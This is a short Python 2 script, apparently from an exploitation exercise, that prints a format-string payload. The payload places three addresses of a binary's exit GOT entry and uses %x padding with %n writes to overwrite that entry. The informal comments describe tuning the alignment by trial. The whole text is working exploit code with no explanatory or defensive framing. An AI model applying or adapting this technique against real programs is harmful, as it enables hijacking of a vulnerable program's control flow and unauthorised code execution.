exit_got1 = "\x24\x97\x04\x08"  # First write address.
exit_got2 = "\x26\x97\x04\x08"  # Second write address.
exit_got3 = "\x27\x97\x04\x08"  # Third write address.
padding1 = "%11322x"*3 + "A"*2
padding2 = "%x"*8 + exit_got3 + 'A'  # My initial set of 5 A's seem to have alligned well, so I thought why not just put the address for the 3rd write here... lol.
padding3 = "%704x-"*4

print exit_got1 + padding1 + "%n" + 'A'*7 + exit_got2 + padding2 + "%n" + padding3 + "%n"

